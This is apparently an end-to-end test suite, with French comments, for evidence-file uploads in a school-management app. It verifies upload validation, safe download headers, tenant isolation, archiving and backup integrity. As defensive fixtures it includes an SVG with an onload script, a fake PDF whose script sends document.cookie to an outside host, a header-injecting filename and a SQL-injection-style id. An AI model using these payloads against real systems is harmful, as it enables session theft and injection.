/**
 * Les pièces justificatives du dossier de catégorisation.
 *
 * CE QUI ÉTAIT FAUX. `category_criteria.evidence_key` est un champ de TEXTE
 * LIBRE. L'écran l'appelait « pièce justificative », comptait les critères
 * « sans pièce », les affichait en rouge, et annonçait le reste « justifié ».
 * Il suffisait donc de TAPER quelque chose dans la case pour qu'un critère
 * devienne justifié. Rien n'était joint, rien n'était vérifié. La
 * démonstration semait elle-même des valeurs comme `evidence/bati.pdf`, qui
 * ressemblent à des chemins de fichiers et n'en étaient pas.
 *
 * Ce dossier décide du PLAFOND LÉGAL des frais de scolarité (arrêté
 * n°2026-101). Un dossier justifié à l'écran et vide devant l'inspection fait
 * baisser le score, donc le plafond, sur une année déjà facturée.
 *
 * CE QUE CETTE SUITE VÉRIFIE :
 *
 *   1. taper une description ne justifie PLUS rien — seul un document joint le
 *      fait. C'est le défaut exact, éprouvé dans les deux sens ;
 *   2. ce qu'on refuse : SVG, fichier trop gros, et surtout un script déguisé
 *      en PDF — le type annoncé vient de l'expéditeur, on regarde les octets ;
 *   3. le téléchargement est une PIÈCE JOINTE, jamais un affichage, avec
 *      `nosniff` et un nom reconstruit — sinon c'est du XSS stocké qui
 *      s'exécute dans la session du directeur ;
 *   4. une pièce d'un autre établissement répond 404, pas 403 ;
 *   5. LA SAUVEGARDE EMPORTE LES OCTETS. C'est la raison pour laquelle ils
 *      sont dans la base et non sur le disque : on le prouve en restaurant.
 *
 *   node tests/pieces.e2e.mjs
 */

import { spawn, execFile } from "node:child_process";
import http from "node:http";
import { promisify } from "node:util";
import { createHash } from "node:crypto";
import pg from "pg";

const execFileP = promisify(execFile);
const PORT = 4237;
const BASE = `http://127.0.0.1:${PORT}`;

let passed = 0;
const failures = [];
const check = (name, cond, detail = "") => {
  if (cond) { passed += 1; console.log(`  ok   ${name}`); }
  else { failures.push(`${name}${detail ? " — " + detail : ""}`); console.log(`  FAIL ${name} ${detail}`); }
};

const client = new pg.Client({ connectionString: process.env.DATABASE_URL });
await client.connect();
const { rows: e } = await client.query(
  `select school_id from auth_lookup_user('70000005')`);
const SCHOOL = e[0].school_id;
await client.query(`select set_config('fasoschool.school_id', $1, false)`, [SCHOOL]);

const HORS_DOSSIER = "Pièce d'une autre école";
const purger = async () => {
  await client.query(`delete from documents where category_criterion_id is not null`);
  /* La ligne « hors dossier » du test porte justement un critère NUL : la
     purge écrite pour les pièces ne la voyait pas, et elle s'accumulait à
     chaque exécution. Une suite doit rendre la base telle qu'elle l'a
     trouvée — sinon c'est la suivante qui paie, ou personne, pendant
     longtemps. */
  await client.query(`delete from documents where label = $1`, [HORS_DOSSIER]);
  await client.query(`delete from audit_log where action like 'piece.%'`);
  await client.query(`delete from auth_rate_limits`);
  await client.query(`delete from auth_otp_challenges`);
};
await purger();

/* On relève les points du dossier AVANT de toucher à quoi que ce soit, et on
   les remet à la fin. Sans cela, cette suite laissait le dossier de
   démonstration à moitié vide et c'est la suite SUIVANTE qui échouait — pour
   une raison qui n'avait rien à voir avec elle. */
const { rows: dossierInitial } = await client.query(
  `select id, awarded_points, evidence_key from category_criteria`);

const server = spawn(process.execPath, ["--experimental-strip-types", "src/server/app.ts"], {
  env: { ...process.env, PORT: String(PORT) }, stdio: ["ignore", "pipe", "pipe"],
});
let stderr = "";
server.stderr.on("data", (d) => { stderr += d.toString(); });
const up = await (async () => {
  for (let i = 0; i < 60; i += 1) {
    try { if ((await fetch(`${BASE}/sante`)).ok) return true; } catch {}
    await new Promise((r) => setTimeout(r, 200));
  }
  return false;
})();
if (!up) { console.error("Le serveur n'a pas démarré.\n" + stderr.slice(0, 1200)); server.kill(); process.exit(1); }

const login = async (phone) => {
  const a = await fetch(`${BASE}/connexion`, { method: "POST", redirect: "manual",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ phone }).toString() });
  const code = ((await a.text()).match(/<b[^>]*>(\d{6})<\/b>/) ?? [])[1];
  const v = await fetch(`${BASE}/connexion/verifier`, { method: "POST", redirect: "manual",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ phone, code }).toString() });
  return (v.headers.get("set-cookie") ?? "").split(";")[0];
};

/** Un envoi multipart fabriqué à la main : c'est ce que fait le navigateur, et
 *  c'est ce que ferait quelqu'un qui contourne le formulaire. */
const envoyer = async (cookie, critere, nom, type, octets, label = "") => {
  const B = "----fs" + Math.random().toString(36).slice(2);
  const tete = (n, v) =>
    Buffer.from(`--${B}\r\nContent-Disposition: form-data; name="${n}"\r\n\r\n${v}\r\n`);
  const corps = Buffer.concat([
    tete("critere", critere), tete("label", label),
    Buffer.from(`--${B}\r\nContent-Disposition: form-data; name="fichier"; `
      + `filename="${nom}"\r\nContent-Type: ${type}\r\n\r\n`),
    octets, Buffer.from(`\r\n--${B}--\r\n`),
  ]);
  const r = await fetch(`${BASE}/categorisation/piece`, { method: "POST",
    headers: { cookie, "content-type": `multipart/form-data; boundary=${B}` },
    body: corps });
  return { statut: r.status, corps: await r.text() };
};

const PDF = Buffer.concat([Buffer.from("%PDF-1.4\n"),
                           Buffer.alloc(2048, 0x41), Buffer.from("\n%%EOF")]);
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.alloc(600, 0x7a)]);

const compte = async (critere) => Number((await client.query(
  `select pieces_du_critere($1) as n`, [critere])).rows[0].n);

try {
  const cookie = await login("70000005");   // le directeur : c'est son dossier
  const { rows: cr } = await client.query(
    `select id, code from category_criteria order by code`);
  const BATI = cr.find((x) => x.code === "BATI");
  const INFO = cr.find((x) => x.code === "INFO");

  /* === 1. Le défaut exact ================================================ */
  console.log("\nTaper une description ne justifie plus rien");
  const avecTexte = await fetch(`${BASE}/categorisation`, { method: "POST",
    headers: { cookie, "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      [`p_${BATI.id}`]: "8", [`e_${BATI.id}`]: "evidence/bati.pdf" }).toString() });
  const apresTexte = await avecTexte.text();
  check("la description est bien enregistrée",
    (await client.query(`select evidence_key from category_criteria where id = $1`,
      [BATI.id])).rows[0].evidence_key === "evidence/bati.pdf");
  check("MAIS LE CRITÈRE RESTE « SANS PIÈCE »",
    /BATI[\s\S]{0,3000}?sans pièce/.test(apresTexte),
    "avant, taper ce texte suffisait à le rendre « justifié »");
  check("et le compte de pièces est toujours zéro", (await compte(BATI.id)) === 0);

  console.log("\nJoindre un vrai document, en revanche, le justifie");
  const depot = await envoyer(cookie, BATI.id, "bati.pdf", "application/pdf", PDF,
    "Photo du bâtiment principal");
  check("le dépôt est accepté", depot.statut === 200);
  check("le fichier est en base", (await compte(BATI.id)) === 1);
  const apresDepot = await (await fetch(`${BASE}/categorisation`, { headers: { cookie } })).text();
  check("LE CRITÈRE N'EST PLUS « SANS PIÈCE »",
    !/BATI[\s\S]{0,3000}?sans pièce/.test(apresDepot));

  /* Un envoi partiel n'efface pas le reste du dossier.
   *
   * Défaut trouvé parce que le POST ci-dessus ne portait QUE le critère BATI :
   * les douze autres se sont retrouvés à null. `saveDossier` lisait
   * `form.get()`, qui ne distingue pas une case vidée d'une case absente de
   * l'envoi, et traitait donc « non soumis » comme « efface ». Le dossier qui
   * décide du plafond légal des frais se vidait sans un mot. */
  console.log("\nUn envoi partiel n'efface pas le reste du dossier");
  const restants = (await client.query(
    `select count(*)::int as n from category_criteria
      where awarded_points is not null`)).rows[0].n;
  check("LES AUTRES CRITÈRES ONT GARDÉ LEURS POINTS", restants === cr.length,
    `${restants} critères notés sur ${cr.length} — un envoi ne portant qu'un `
      + `critère effaçait tous les autres`);

  /* === 2. Ce qu'on refuse ================================================ */
  console.log("\nCe qui est refusé, et pourquoi");
  const svg = await envoyer(cookie, INFO.id, "logo.svg", "image/svg+xml",
    Buffer.from("<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"));
  check("UN SVG EST REFUSÉ", /pas accepté/.test(svg.corps),
    "un SVG est un document XML qui peut porter du JavaScript");
  check("et le refus dit pourquoi", /SVG/.test(svg.corps));

  const deguise = await envoyer(cookie, INFO.id, "rapport.pdf", "application/pdf",
    Buffer.from("<html><script>fetch('//ailleurs?c='+document.cookie)</script>"));
  check("UN SCRIPT DÉGUISÉ EN PDF EST REFUSÉ",
    /n(?:'|&#39;)en est pas un/.test(deguise.corps),
    "le type annoncé vient du navigateur de l'expéditeur : on regarde les octets");

  const gros = await envoyer(cookie, INFO.id, "gros.pdf", "application/pdf",
    Buffer.concat([Buffer.from("%PDF-1.4\n"), Buffer.alloc(6 * 1024 * 1024, 0x41)]));
  check("un fichier de 6 Mo est refusé", /trop volumineux|limite est/.test(gros.corps),
    gros.corps.slice(0, 120));
  check("rien de tout cela n'a été enregistré", (await compte(INFO.id)) === 0);

  /* Le refus ne doit pas casser la requête SUIVANTE.
   *
   * Défaut trouvé en écrivant ce test. `readMultipart` levait son erreur au
   * MILIEU du flux, dès le dépassement, sans consommer le reste du corps.
   * Node répond, puis détruit la connexion parce qu'il reste des octets non
   * lus dessus ; le navigateur la garde ouverte (keep-alive), y envoie sa
   * requête suivante, et reçoit un ECONNRESET. Un directeur qui essaie de
   * joindre un scan de 10 Mo obtenait donc un refus poli, puis un écran cassé
   * au clic suivant, sans rien pour l'expliquer.
   *
   * On force ici la réutilisation de la connexion : sans `keepAlive`, le test
   * ouvrirait une socket neuve et ne verrait jamais le défaut. */
  console.log("\nUn refus ne casse pas la requête suivante");
  const agent = new http.Agent({ keepAlive: true, maxSockets: 1 });
  const parAgent = (chemin, methode, entetes, corps) => new Promise((ok, ko) => {
    const rq = http.request({ host: "127.0.0.1", port: PORT, path: chemin,
      method: methode, agent, headers: { cookie, ...entetes } }, (rs) => {
      const t = []; rs.on("data", (c) => t.push(c));
      rs.on("end", () => ok({ statut: rs.statusCode, reutilisee: rs.socket }));
    });
    rq.on("error", (err) => ko(err));
    if (corps) rq.write(corps);
    rq.end();
  });

  const B2 = "----fsbig";
  const enorme = Buffer.concat([
    Buffer.from(`--${B2}\r\nContent-Disposition: form-data; name="critere"\r\n\r\n${INFO.id}\r\n`),
    Buffer.from(`--${B2}\r\nContent-Disposition: form-data; name="fichier"; `
      + `filename="scan.pdf"\r\nContent-Type: application/pdf\r\n\r\n`),
    Buffer.from("%PDF-1.4\n"), Buffer.alloc(7 * 1024 * 1024, 0x41),
    Buffer.from(`\r\n--${B2}--\r\n`)]);

  const refus = await parAgent("/categorisation/piece", "POST",
    { "content-type": `multipart/form-data; boundary=${B2}` }, enorme);
  check("le fichier trop gros est refusé proprement", refus.statut === 200,
    `statut ${refus.statut}`);
  const premiereSocket = refus.reutilisee;

  let suivante = null, plante = null;
  try { suivante = await parAgent("/categorisation", "GET", {}); }
  catch (err) { plante = String(err.code ?? err.message); }
  check("ET LA REQUÊTE SUIVANTE PASSE, SUR LA MÊME CONNEXION",
    plante === null && suivante?.statut === 200,
    plante ? `elle est morte : ${plante}` : `statut ${suivante?.statut}`);
  check("la connexion a bien été réutilisée",
    suivante?.reutilisee === premiereSocket,
    "sans réutilisation, ce test ne prouverait rien");
  agent.destroy();

  const doublon = await envoyer(cookie, BATI.id, "copie.pdf", "application/pdf", PDF);
  check("le même fichier joint deux fois est refusé", /déjà joint/.test(doublon.corps));
  check("et il n'y en a toujours qu'un", (await compte(BATI.id)) === 1);

  /* === 3. Le téléchargement ============================================== */
  console.log("\nLe téléchargement ne s'affiche jamais dans le navigateur");
  const { rows: d1 } = await client.query(
    `select id, sha256 from documents where category_criterion_id = $1`, [BATI.id]);
  const tel = await fetch(`${BASE}/categorisation/piece?id=${d1[0].id}`,
    { headers: { cookie } });
  const recu = Buffer.from(await tel.arrayBuffer());
  check("il répond 200", tel.status === 200);
  check("LES OCTETS SONT IDENTIQUES", recu.equals(PDF),
    `${recu.length} octets reçus pour ${PDF.length}`);
  check("et leur empreinte aussi",
    createHash("sha256").update(recu).digest("hex") === d1[0].sha256);
  const cd = tel.headers.get("content-disposition") ?? "";
  check("C'EST UNE PIÈCE JOINTE, PAS UN AFFICHAGE", cd.startsWith("attachment"),
    `« ${cd} » — affiché depuis notre origine, un document s'exécuterait avec `
      + `le cookie de session du directeur`);
  check("et le navigateur ne devine pas le type",
    (tel.headers.get("x-content-type-options") ?? "") === "nosniff");

  console.log("\nLe nom du fichier ne s'échappe pas de l'en-tête");
  await envoyer(cookie, INFO.id, "plan.png", "image/png", PNG,
    'x"; filename="virus.exe\r\nSet-Cookie: a=b');
  const { rows: d2 } = await client.query(
    `select id from documents where category_criterion_id = $1`, [INFO.id]);
  const tel2 = await fetch(`${BASE}/categorisation/piece?id=${d2[0].id}`,
    { headers: { cookie } });
  const cd2 = tel2.headers.get("content-disposition") ?? "";
  check("le nom proposé est reconstruit", /^attachment; filename="[A-Za-z0-9._-]+"$/.test(cd2),
    cd2);
  check("aucun en-tête n'a été injecté", tel2.headers.get("set-cookie") === null);

  /* === 4. Une pièce d'un autre établissement ============================= */
  console.log("\nUne pièce d'un autre établissement est introuvable, pas interdite");
  await client.query(`select set_config('fasoschool.school_id', $1, false)`, [SCHOOL]);
  const etranger = (await client.query(
    `insert into documents (school_id, category_criterion_id, label, doc_type,
                            content, content_type, byte_size, sha256)
     values ($1, null, $5, 'declaration',
             $2, 'application/pdf', $3, $4) returning id`,
    [SCHOOL, PDF, PDF.length, "0".repeat(64), HORS_DOSSIER])).rows[0].id;
  /* Rattachée à aucun critère : la route ne doit servir QUE des pièces de
     dossier, et c'est aussi ce qui empêche d'exfiltrer un futur bulletin ou
     reçu par la même URL. */
  const horsDossier = await fetch(`${BASE}/categorisation/piece?id=${etranger}`,
    { headers: { cookie } });
  check("UN DOCUMENT HORS DOSSIER N'EST PAS SERVI PAR CETTE ROUTE",
    horsDossier.status === 404, `statut ${horsDossier.status}`);

  const inexistant = await fetch(
    `${BASE}/categorisation/piece?id=99999999-9999-9999-9999-999999999999`,
    { headers: { cookie } });
  check("un identifiant inconnu répond 404 lui aussi", inexistant.status === 404,
    "un 403 confirmerait que l'identifiant existe");
  const bricole = await fetch(`${BASE}/categorisation/piece?id=' or 1=1--`,
    { headers: { cookie } });
  check("et un identifiant bricolé ne fait pas tomber le serveur",
    bricole.status === 404, `statut ${bricole.status}`);

  /* === 5. Retirer archive, n'efface pas ================================== */
  console.log("\nRetirer une pièce l'archive, ne l'efface pas");
  const retrait = await fetch(`${BASE}/categorisation/piece/retirer`, {
    method: "POST", headers: { cookie, "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ id: d1[0].id }).toString() });
  const ditRetrait = await retrait.text();
  check("le retrait est confirmé", /retiré/.test(ditRetrait));
  check("le critère redevient « sans pièce »", (await compte(BATI.id)) === 0);
  const { rows: arch } = await client.query(
    `select status, octet_length(content) as n from documents where id = $1`, [d1[0].id]);
  check("MAIS LA LIGNE EXISTE TOUJOURS, ARCHIVÉE", arch[0]?.status === "archive",
    "une pièce qui a servi à justifier un score déclaré ne disparaît pas sans trace");
  check("et son contenu est intact", arch[0]?.n === PDF.length);
  const { rows: j } = await client.query(
    `select count(*)::int as n from audit_log where action = 'piece.retrait'`);
  check("le retrait est au journal", j[0].n === 1);
  check("la pièce archivée n'est plus téléchargeable",
    (await fetch(`${BASE}/categorisation/piece?id=${d1[0].id}`,
      { headers: { cookie } })).status === 404);

  /* === 6. La sauvegarde emporte les octets =============================== */
  console.log("\nLA SAUVEGARDE EMPORTE LES OCTETS — c'est pourquoi ils sont en base");
  const APP = process.env.DATABASE_URL ?? "";
  const hote = APP.replace(/^postgres:\/\/[^@]*@[^/]*\/[^?]*/, "");
  const base = (APP.match(/\/([^/?]+)\?/) ?? [])[1] ?? "demo";
  const adminSur = (b) => `postgres://postgres@/${b}${hote}`;
  const COPIE = `fasoschool_pieces_${process.pid}`;
  const psql = (u, ...a) => execFileP("psql", [u, ...a]).catch((x) => ({ stdout: "", stderr: String(x) }));

  await psql(adminSur("postgres"), "-q", "-c", `drop database if exists ${COPIE}`);
  try {
    const dump = `/tmp/fs-pieces-${process.pid}.dump`;
    await execFileP("pg_dump", ["--format=custom", "--no-owner", "--no-privileges",
      "-f", dump, adminSur(base)]);
    await psql(adminSur("postgres"), "-q", "-c", `create database ${COPIE}`);
    await execFileP("pg_restore", ["--no-owner", "--no-privileges",
      "-d", adminSur(COPIE), dump]).catch(() => {});

    const { stdout } = await execFileP("psql", [adminSur(COPIE), "-tAc",
      `select encode(sha256(content), 'hex') || '|' || octet_length(content)
         from documents where id = '${d1[0].id}'`]);
    const [shaRestaure, tailleRestauree] = stdout.trim().split("|");
    check("LE FICHIER SURVIT À UNE SAUVEGARDE ET UNE RESTAURATION",
      shaRestaure === d1[0].sha256,
      "s'il était sur le disque à côté de la base, il ne survivrait pas — "
        + "c'est la seconde chose à sauvegarder, celle dont personne ne se souvient");
    check("et il fait toujours la même taille",
      Number(tailleRestauree) === PDF.length, tailleRestauree);
    await execFileP("rm", ["-f", dump]).catch(() => {});
  } finally {
    await psql(adminSur("postgres"), "-q", "-c", `drop database if exists ${COPIE}`);
  }

  check("le serveur n'a levé aucune erreur", !/error/i.test(stderr),
    stderr.slice(-200));

} finally {
  server.kill();
  await client.query(`select set_config('fasoschool.school_id', $1, false)`, [SCHOOL])
    .catch(() => {});
  await purger().catch(() => {});
  for (const c of dossierInitial) {
    await client.query(
      `update category_criteria set awarded_points = $2, evidence_key = $3
        where id = $1`, [c.id, c.awarded_points, c.evidence_key]).catch(() => {});
  }
  await client.end();
}

console.log(`\n${passed} assertions passées, ${failures.length} échec(s).`);
if (failures.length) {
  failures.forEach((f) => console.log("  - " + f));
  process.exit(1);
}
console.log("Une pièce justificative est un fichier, plus une chaîne tapée.");
